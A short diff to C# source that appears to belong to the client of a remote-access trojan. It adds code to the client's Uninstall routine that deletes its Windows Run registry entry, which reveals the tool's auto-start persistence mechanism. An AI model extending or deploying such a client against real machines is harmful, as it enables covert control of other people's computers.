@@ -1,6 +1,7 @@
 ﻿using Client.Helper;
 using Client.MessagePack;
 using Client.Sockets;
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -222,6 +223,14 @@ namespace Client.Handle_Packet
 
         private static void Uninstall()
         {
+            if (Convert.ToBoolean(Settings.Install))
+            {
+                try
+                {
+                    Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").DeleteValue(Path.GetFileName(Settings.ClientFullPath));
+                }
+                catch { }
+            }
             ProcessStartInfo Del = null;
             try
             {
